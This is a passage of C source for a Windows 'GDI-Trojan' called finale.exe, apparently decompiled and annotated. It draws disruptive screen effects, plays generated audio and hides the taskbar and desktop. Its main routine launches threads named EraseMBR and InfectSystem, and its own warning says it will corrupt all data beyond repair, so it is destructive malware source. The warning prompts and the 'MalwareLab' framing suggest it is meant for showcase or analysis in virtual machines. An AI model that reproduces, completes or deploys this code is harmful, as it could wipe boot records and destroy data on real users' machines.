        StretchBlt(hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY);
        DeleteDC(hdcDest);
        DeleteObject(v1);
        Sleep(10);
    }
}

DWORD WINAPI Pattern0(
    IN LPVOID lpvThreadParameter )
{
    HBITMAP v1;
    BITMAPINFO pbmi;
    PVOID ppvBits;
    INT v4;
    INT v5;
    HDC hdcDest;
    INT hDest;
    INT wDest;
    HDC hdc;
    INT j;
    INT i;

    hdc = GetDC( HWND_DESKTOP );

    while ( TRUE )
    {
        wDest = _w / 8;
        hDest = _h / 8;

        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;

        hdcDest = CreateCompatibleDC(hdc );
        v1 = CreateDIBSection( hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0 );

        SelectObject( hdcDest, v1 );

        StretchBlt( hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCCOPY );

        for ( i = 0; i < wDest; i++ )
        {
            for ( j = 0; j < hDest; j++)
            {
                v5 = wDest * j + i;
                v4 = rand( );

                // BGR order
                // blue green red

                // didn't converted to RGBQUAD
                // because I'm waaay too lazy
                // do it yourself

                // ppvBits[ v5 ].b = v4;
                // ppvBits[ v5 ].g = v4;
                // ppvBits[ v5 ].b = v4;
                *( ( PBYTE )ppvBits + 4 * v5 + 2    /* Blue = ( + 2 ) */ ) = v4;
                *( ( PBYTE )ppvBits + 4 * v5 + 1   /* Green = ( + 1 ) */ ) = v4;
                *( ( PBYTE )ppvBits + 4 * v5     /* Red = ( Nothing ) */ ) = v4;
            }
        }

        StretchBlt( hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY );

        DeleteObject( v1 );
        DeleteDC( hdcDest );

        Sleep( 10 );
    }
}

DWORD WINAPI Pattern1(
    IN LPVOID lpvThreadParameter )
{
    HBITMAP v1;
    BITMAPINFO pbmi;
    PVOID ppvBits;
    INT v2;
    INT v5;
    INT v6;
    HDC hdcDest;
    INT hDest;
    INT wDest;
    HDC hdc;
    INT j;
    INT i;

    hdc = GetDC( HWND_DESKTOP );

    while ( TRUE )
    {
        wDest = _w / 2;
        hDest = _h / 2;

        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = wDest;
        pbmi.bmiHeader.biHeight             = hDest;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;

        hdcDest = CreateCompatibleDC(hdc );
        v1 = CreateDIBSection( hdc, &pbmi, DIB_RGB_COLORS, &ppvBits, NULL, 0 );

        SelectObject( hdcDest, v1 );

        StretchBlt( hdcDest, 0, 0, wDest, hDest, hdc, 0, 0, _w, _h, SRCERASE );

        for ( i = 0; i < wDest; i++ )
        {
            for ( j = 0; j < hDest; j++)
            {
                v6 = wDest * j + i;
                v2 = rand( );

                // I'm not converting this to math
                // well it's still not that hard though
                // do it yourself again
                v5 = 0x10101 * ( ( unsigned __int8 )( ( ( unsigned int )( v2 >> 31 ) >> 24 ) + v2 ) - ( ( unsigned int )( v2 >> 31 ) >> 24 ) );

                *( ( PBYTE )ppvBits + 4 * v6 + 2    /* Blue = ( + 2 ) */ ) += j;
                *( ( PBYTE )ppvBits + 4 * v6 + 1   /* Green = ( + 1 ) */ ) += j + v5 & i;
                *( ( PBYTE )ppvBits + 4 * v6     /* Red = ( Nothing ) */ ) += i ^ j;
            }
        }

        StretchBlt( hdc, 0, 0, _w, _h, hdcDest, 0, 0, wDest, hDest, SRCCOPY );

        DeleteObject( v1 );
        DeleteDC( hdcDest );

        Sleep( 10 );
    }
}

DWORD WINAPI Pattern2(
    IN LPVOID lpvThreadParameter )
{
    HBITMAP v1;
    BITMAPINFO pbmi;
    RGBQUAD* rgbQuad;
    HDC hdcDest;
    HDC hdc;
    INT j;
    INT i;
    INT counter;

    hdc = GetDC( HWND_DESKTOP );

    counter = 0;

    while ( TRUE )
    {
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = _w;
        pbmi.bmiHeader.biHeight             = _h;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;

        hdcDest = CreateCompatibleDC(hdc );
        v1 = CreateDIBSection( hdc, &pbmi, DIB_RGB_COLORS, ( PVOID* )&rgbQuad, NULL, 0);

        SelectObject( hdcDest, v1 );

        BitBlt( hdcDest, 0, 0, _w, _h, hdc, 0, 0, SRCCOPY );

        RGBQUAD rgbquadCopy;
        HSL hslcolor;

        for ( i = 0; i < _w; i++ )
        {
            for ( j = 0; j < _h; j++ )
            {
                INT index = j * _w + i;
                FLOAT fx = j * i + counter;

                rgbquadCopy = rgbQuad[ index ];

                hslcolor = rgbQuadToHSV( rgbquadCopy );

                // no fast math and no brain, WoW!
                hslcolor.h = fmodf( fx / 500.f + hslcolor.h + .02f, 1.f );
                hslcolor.s = 1.f;
                hslcolor.l = .5f;

                rgbQuad[ index ] = hsvToRGB( hslcolor );
            }
        }

        counter++;

        BitBlt( hdc, 0, 0, _w, _h, hdcDest, 0, 0, SRCCOPY );

        DeleteObject( v1 );
        DeleteDC( hdcDest );

        Sleep( 10 );
    }
}

DWORD WINAPI Pattern3(
    IN LPVOID lpvThreadParameter )
{
    HBITMAP v1;
    BITMAPINFO pbmi;
    RGBQUAD* rgbQuad;
    HDC hdcDest;
    HDC hdc;
    INT j;
    INT i;
    INT counter;
    INT xPos;
    INT yPos;

    hdc = GetDC( HWND_DESKTOP );

    counter = 0;

    while ( TRUE )
    {
        pbmi.bmiHeader.biSize               = sizeof( pbmi );
        pbmi.bmiHeader.biWidth              = _w;
        pbmi.bmiHeader.biHeight             = _h;
        pbmi.bmiHeader.biPlanes             = 1;
        pbmi.bmiHeader.biBitCount           = 32;
        pbmi.bmiHeader.biCompression        = BI_RGB;

        hdcDest = CreateCompatibleDC(hdc );
        v1 = CreateDIBSection( hdc, &pbmi, DIB_RGB_COLORS, ( PVOID* )&rgbQuad, NULL, 0);

        SelectObject( hdcDest, v1 );

        BitBlt( hdcDest, 0, 0, _w, _h, hdc, 0, 0, SRCCOPY );

        RGBQUAD rgbquadCopy;
        HSL hslcolor;

        xPos = rand( ) % _w;
        yPos = rand( ) % _h;

        for ( i = 0; i < _w; i++ )
        {
            for ( j = 0; j < _h; j++ )
            {
                INT index = j * _w + i;

                FLOAT fCntr = ( FLOAT )( counter + 128 );

                // X_x => I'm dead.
                FLOAT fX_x = i - xPos / 2;
                FLOAT fY_y = j - yPos / 2;

                // no fast math and no brain, WoW!
                FLOAT fSqr = sqrtf( ( FLOAT )( fX_x * fX_x + fY_y * fY_y ) );
                FLOAT fx   = sinf( fSqr / fCntr ) * fCntr + fCntr;

                rgbquadCopy = rgbQuad[ index ];

                hslcolor = rgbQuadToHSV( rgbquadCopy );

                // no fast math and no brain, WoW!
                hslcolor.h = fmodf( fx / 500.f + hslcolor.h + .02f, 1.f );
                hslcolor.s = 1.f;
                hslcolor.l = .5f;

                rgbQuad[ index ] = hsvToRGB( hslcolor );
            }
        }

        counter++;

        BitBlt( hdc, 0, 0, _w, _h, hdcDest, 0, 0, SRCCOPY );

        DeleteObject( v1 );
        DeleteDC( hdcDest );

        Sleep( 10 );
    }
}

VOID ExecuteMBRPattern( VOID )
{
    HANDLE v1;
    HANDLE v2;
    HANDLE v3;
    HANDLE Thread;

    Thread = CreateThread( NULL, 0, Pattern0, NULL, 0, NULL );
    Sleep( 3000 );

    EndHandle( Thread );

    v3 = CreateThread( NULL, 0, Pattern1, NULL, 0, NULL );
    Sleep( 30000 );

    EndHandle( v3 );

    v2 = CreateThread( NULL, 0, Pattern2, NULL, 0, NULL );
    Sleep( 30000 );

    EndHandle( v2 );

    v1 = CreateThread( NULL, 0, Pattern3, NULL, 0, NULL );
    Sleep( 30000 );

    EndHandle( v1 );
}

VOID WINAPI AudioSequence1( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 960000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;

    nHertz = 32000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            sin( t >> 8 ^ t >> 2 ) * 2
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

VOID WINAPI AudioSequence2( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 480000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;

    nHertz = 16000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            sin( t >> 9 ^ ( INT )( floor( t / 10 ) ) * ( ( INT )( floor( t / 0x18000 ) ) & 2 | t >> 9 ) ) * 2
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

VOID WINAPI AudioSequence3( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 160000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;

    nHertz = 8000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            tan( t >> 12 ^ t >> 2 ) * 2
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

VOID WINAPI AudioSequence4( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 80000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;

    nHertz = 4000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            sin( t >> 9 ^ ( INT )( floor( t / 10 ) ) * ( ( INT )( floor( t / 0x18000 ) ) & 2 | t >> 9 ) ) * 2
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

VOID WINAPI AudioSequence5( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 880000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;

    nHertz = 44000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            ( t >> 5 ) * ( sin( t >> 4 ) * 2 )
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

VOID WINAPI AudioSequence6( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 120000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;

    nHertz = 4000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            tan( t >> 12 ^ t >> 2 ) * 2
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

VOID WINAPI AudioSequence7( VOID )
{
    WAVEHDR pwh;
    CHAR v3[ 20000 ];
    WAVEFORMATEX pwfx;
    HWAVEOUT phwo;
    UINT t;
    INT nHertz;
    
    nHertz = 4000;

    phwo = NULL;

    pwfx.wFormatTag           = WAVE_FORMAT_PCM;
    pwfx.nChannels            = 1;
    pwfx.nSamplesPerSec       = nHertz;
    pwfx.wBitsPerSample       = 8;
    pwfx.nBlockAlign          = pwfx.nChannels * pwfx.wBitsPerSample / 8;
    pwfx.nAvgBytesPerSec      = pwfx.nSamplesPerSec * pwfx.nBlockAlign;
    pwfx.cbSize               = 0;

    waveOutOpen( &phwo, WAVE_MAPPER, &pwfx, NULL, NULL, 0 );

    RtlZeroMemory(
        v3,
        sizeof( v3 ) );

    for ( t = 0; t < sizeof( v3 ); t++ )
    {
        v3[ t ] = ( CHAR )(
            t * rand( )
            );
    }

    pwh.dwBufferLength      = sizeof( v3 );
    pwh.lpData              = v3;
    pwh.dwFlags             = 0;

    waveOutPrepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutWrite( phwo, &pwh, sizeof( pwh ) );

    waveOutUnprepareHeader( phwo, &pwh, sizeof( pwh ) );
    waveOutClose( phwo );
}

INT WINAPI WinMain(
    HINSTANCE hInst,
    HINSTANCE hPreInst,
    LPSTR lpszCmdLine,
    INT nCmdShow )
{
    HWND WindowW;
    HWND DesktopWindow;

    // the most ugliest threading system that I've ever seen
    HANDLE v6;
    HANDLE v7;
    HANDLE v8;
    HANDLE v9;
    HANDLE v10;
    HANDLE v11;
    HANDLE v12;
    HANDLE v13;
    HANDLE v14;
    HANDLE v15;
    HANDLE v16;
    HANDLE v17;
    HANDLE v18;
    HANDLE v19;
    HANDLE Thread;
    UINT seed;

    seed = ( UINT )GetTickCount( );
    srand( seed );

    initGlVars( );

    if ( GetFileAttributesW( L"C:\\WINDOWS\\cmdbtcfg.dat" ) == INVALID_FILE_ATTRIBUTES )
    {
        // shitti formattin'
        if ( MessageBoxW(
            HWND_DESKTOP,
            L"You are now running the finale.exe GDI-Trojan horse made for MalwareLab150 to test. The creator assumes zero "
            "responsibility for any damage made using this malware.\n"
            "\n"
            "If you are running this on a physical machine with important data, hit ''No'' and get rid of this file quick"
            "ly.\n"
            "If you are running in an isolated environment, like a virtual machine or Windows Sandbox, you may hit ''Yes'"
            "' and nothing will happen to your data on your main PC.\n"
            "\n"
            "Once again, MalwareRenders, the creator of this GDI malware, is not responsible for any damages made using i"
            "t in any way, including, but not limited to, executing it, reverse engineering it or modifying it.\n"
            "Proceed to execute?",
            L"GDI-Trojan.Win32.Finale.exe",
            MB_ICONEXCLAMATION | MB_YESNO | MB_DEFBUTTON2 ) == IDNO )
        {
            exit( EXIT_SUCCESS );
        }
        if ( MessageBoxW(
            HWND_DESKTOP,
            L"THIS IS THE FINAL WARNING!!\n"
            "\n"
            "THIS IS A MALWARE THAT WILL CORRUPT ALL YOUR DATA BEYOND REPAIR!\n"
            "STILL EXECUTE IT?",
            L"!!! LAST WARNING, WANT TO PLAY FORBIDDEN GAMES?! !!!",
            MB_ICONEXCLAMATION | MB_YESNO | MB_DEFBUTTON2 ) == IDNO )
        {
            exit( EXIT_SUCCESS );
        }
    }

    if ( !ifWindowsXP( ) )
    {
        // why is he running the same thread twice

        Sleep( 3000 );
        CreateThread( NULL, 0, Wallpaper, NULL, 0, NULL );
        Sleep( 2000 );
        CreateThread( NULL, 0, Wallpaper, NULL, 0, NULL );

        Sleep( 2000 );

        ExecuteMBRPattern( );
    }

    CreateThread( NULL, 0, EraseMBR, NULL, 0, NULL );
    CreateThread( NULL, 0, InfectSystem, NULL, 0, NULL );

    Sleep( 3000 );

    Thread = CreateThread( NULL, 0, RGBQUAD1, NULL, 0, NULL );
    AudioSequence1( );

    Sleep( 30000 );
    EndHandle( Thread );

    v19 = CreateThread( NULL, 0, RGBQUAD2, NULL, 0, NULL );
    Sleep( 10 );
    v18 = CreateThread( NULL, 0, StrongWaves, NULL, 0, NULL );
    Sleep( 10 );
    v17 = CreateThread( NULL, 0, Plg1, NULL, 0, NULL );
    Sleep( 10 );
    v16 = CreateThread( NULL, 0, Bounce, NULL, 0, NULL );
    Sleep( 10 );

    AudioSequence2( );

    // true memer
    Sleep( 5000 );
    Sleep( 25000 );

    EndHandle( v19 );

    v15 = CreateThread( NULL, 0, RGBQUAD3, NULL, 0, NULL );
    Sleep( 10 );

    AudioSequence3( );

    Sleep( 20000 );

    EndHandle( v15 );
    EndHandle( v18 );

    v14 = CreateThread( NULL, 0, RGBQUAD4, NULL, 0, NULL );
    Sleep( 10 );

    AudioSequence4( );

    Sleep( 20000 );

    EndHandle( v17 );
    EndHandle( v14 );
    EndHandle( v16 );

    v13 = CreateThread( NULL, 0, RGBQUAD5, NULL, 0, NULL );
    Sleep( 10 );
    v12 = CreateThread( NULL, 0, Split1, NULL, 0, NULL );
    Sleep( 10 );
    v11 = CreateThread( NULL, 0, StrongWaves, NULL, 0, NULL );
    Sleep( 10 );
    v10 = CreateThread( NULL, 0, Plg1, NULL, 0, NULL );
    Sleep( 10 );
    v9 = CreateThread( NULL, 0, Bounce, NULL, 0, NULL );
    Sleep( 10 );

    AudioSequence5( );

    Sleep( 20000 );

    EndHandle( v13 );

    v8 = CreateThread( NULL, 0, HSVFx1, NULL, 0, NULL );
    Sleep( 10 );

    AudioSequence6( );

    Sleep( 5000 );

    v7 = CreateThread( NULL, 0, RGBQUAD6, NULL, 0, NULL );
    Sleep( 25000 );

    EndHandle( v10 );
    EndHandle( v7 );
    EndHandle( v9 );
    EndHandle( v12 );
    EndHandle( v8 );
    EndHandle( v11 );

    CreateThread( NULL, 0, Wallpaper, NULL, 0, NULL );

    WindowW = FindWindowW( L"Shell_TrayWnd", NULL );
    ShowWindow( WindowW, SW_HIDE );

    DesktopWindow = GetDesktopWindow( );
    ShowWindow( DesktopWindow, SW_HIDE );

    v6 = CreateThread( NULL, 0, RGBQUADFINAL, NULL, 0, NULL );

    AudioSequence7( );

    Sleep( 5000 );

    EndHandle( v6 );

    while ( TRUE )
    {
        ExecuteMBRPattern( );
    }
}
